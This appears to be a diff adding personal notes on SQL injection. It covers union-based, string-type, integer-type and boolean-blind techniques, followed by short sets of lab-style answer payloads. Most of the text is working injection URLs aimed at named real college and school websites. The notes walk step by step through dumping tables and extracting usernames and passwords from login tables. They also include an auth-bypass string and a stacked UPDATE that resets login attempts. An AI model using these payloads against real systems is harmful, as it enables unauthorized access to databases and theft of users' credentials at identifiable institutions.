@@ -1,0 +1,148 @@
+Check vulnerable or not : 
+
+http://www.simscollege.ac.in/news.php?id=52' order 1--+- OK
+http://www.simscollege.ac.in/news.php?id=52' order 1000--+- NOT OK
+in the above case, SQL injection can perform
+STRING BASED( because, ' is the part of string)
+
+http://www.simscollege.ac.in/news.php?id=52 order by 1--+- OK
+http://www.simscollege.ac.in/news.php?id=52 order by 10000--+- OK
+in this case, for small and big number, both are ok,, that means no SQL injection can be performed,,, 
+INTEGER BASED( 52 is just an integer)
+
+
+Now if i want to get all the tables simultaneously, then these commands are very helpful:
+
+ insert it into the query part, it gives you the full database ( if one fails, then try the next one)
+1)
+(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
+2)
+(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))
+3)
+(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
+4)
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
+
+
+for example : 
+http://www.simscollege.ac.in/news.php?id=52%27 union select 1,2,3,4,5,6,7,8,9,10,(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)--+-
+
+
+
+Example of String type SQL Injection : 
+
+http://www.simscollege.ac.in/news.php?id=52' order by 11--+-   // here total number # of column is 11
+
+http://www.simscollege.ac.in/news.php?id=52%27%20union%20select%201,2,3,4,5,6,7,8,9,10,version()--+-  // get the version of database
+http://www.simscollege.ac.in/news.php?id=52%27%20union%20select%201,2,3,4,5,6,7,8,9,10,database()--+- // get the name of the database
+
+http://www.simscollege.ac.in/news.php?id=52%27 union select 1,2,3,4,5,6,7,8,9,10,(select table_name from information_schema.tables where table_schema=database() limit 0,1)--+- 
+// get the first table name of the database ( limit first number indicates the table number index , 0 means first table)
+
+
+http://www.simscollege.ac.in/news.php?id=52%27 union select 1,2,3,4,5,6,7,8,9,10,(select column_name from information_schema.columns where table_name='tbl_user_access' limit 0,1)--+-
+//to get the information from that table ,, here 'tbl_user_access' is the corresponding table name which is the fourth table of that database
+// here 0 index gives username field, and index 1 gives pwd field
+
+http://www.simscollege.ac.in/news.php?id=52%27 union select 1,2,3,4,5,6,7,8,9,10,(select username from tbl_user_access limit 0,1)--+-
+// to get the username from that field ( column)
+
+http://www.simscollege.ac.in/news.php?id=52%27 union select 1,2,3,4,5,6,7,8,9,10,(select pwd from tbl_user_access limit 0,1)--+-
+// to get the password from table
+
+http://www.simscollege.ac.in/news.php?id=52%27 union select 1,2,3,4,5,6,7,8,9,10,(select table_name from information_schema.tables where table_schema=database() limit 1,1)--+-
+
+
+
+select group_concat(table_name,':','<br>') from information_schema.tables where table_schema=database()-- -
+select group_concat(column_name,':','<br>') from information_schema.columns where table_name='table_name'-- -
+select group_concat(username,':',password) FROM table_name-- -
+
+
+select * from users where username='' and password='' OR 1=1;
+
+
+Example of Integer Type SQL Injection:
+
+
+https://mtspublicschool.ac.in/news.php?id=37 order by 1--+- OK
+https://mtspublicschool.ac.in/news.php?id=37 order by 100000--+- NOT OK
+//that means this site is vulnerable,
+
+
+https://mtspublicschool.ac.in/news.php?id=37' order by 1--+- NOT OK
+https://mtspublicschool.ac.in/news.php?id=37' order by 100000--+- NOT OK
+// that means it is not String type SQL injection 
+
+
+// to find out the column number use the order by 
+https://mtspublicschool.ac.in/news.php?id=37 order by 3-- -
+
+
+https://mtspublicschool.ac.in/news.php?id=37 union select 1,2,3-- -
+https://mtspublicschool.ac.in/news.php?id=37 order by 3-- -
+
+
+https://mtspublicschool.ac.in/news.php?id=37 union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a),3--+-
+// here index 2 contains the tables that's why we use query in that place , 1 and 3 as it is 
+
+
+// if i want to get more than two information from different columns,, then use concat  
+https://mtspublicschool.ac.in/news.php?id=37%20union%20select%201,(select%20concat(username,%27-%27,password)%20from%20login_tb),3--+-
+
+
+
+if can not able to find out the which SQL Injection then use blind : 
+
+Example of Boolean type SQL Injection / blind : 
+
+http://www.simscollege.ac.in/news.php?id=52%27 and 1=1--+- TRUE
+http://www.simscollege.ac.in/news.php?id=52%27 and 1=2--+- FALSE
+
+// check first character greater than 1 
+http://www.simscollege.ac.in/news.php?id=52%27 and ascii(substr(version(),1,1))>1--+-
+
+// first latter of version is 1 which ascii value is 49, so this works 
+http://www.simscollege.ac.in/news.php?id=52%27%20and%20ascii(substr(version(),1,1))=49--+-
+
+// this different, so shows nothing
+http://www.simscollege.ac.in/news.php?id=52%27%20and%20ascii(substr(version(),1,1))%3E1999--+-
+
+
+
+select group_concat(table_name,':','<br>') from information_schema.tables where table_schema=database()-- -
+select group_concat(column_name,':','<br>') from information_schema.columns where table_name='table_name'-- -
+select group_concat(username,':',password) FROM table_name-- -
+
+----------A1----------------
+Payload 1: username: admin' OR '1'='1
+	   password: anything
+	   
+Payload 2:
+http://98.70.26.135:8080/search.php?query=52%27%20order%20by%204--+-
+http://98.70.26.135:8080/search.php?query=52%27%20union%20select%201,2,3,4--+-
+http://98.70.26.135:8080/search.php?query=52%27%20union%20select%201,(select%20secret_key%20from%20hidden_data%20limit%200,1),3,4--+-
+
+----------B1--------------------
+
+' or '1'='1
+' UNION SELECT student_name FROM enrollments -- ;
+' and 1=(SELECT 1 FROM enrollments WHERE student_name = 'Irtiaz Kabir'  AND course_name='Database')--;
+
+
+-------------A2-----------------
+'; UPDATE users SET tries_today=0 WHERE username='2005045' #
+' UNION SELECT day, word, null FROM answers WHERE DAY='2025-07-13' #
+
+--------------B2---------------
+payload 1 : 
+
+' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,group_concat(table_name,':','<br>') from information_schema.tables where table_schema=database() -- -
+' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,group_concat(column_name,':','<br>') from information_schema.columns where table_name='mbbs_result_20_21'-- -
+
+
+
+
+
+
+
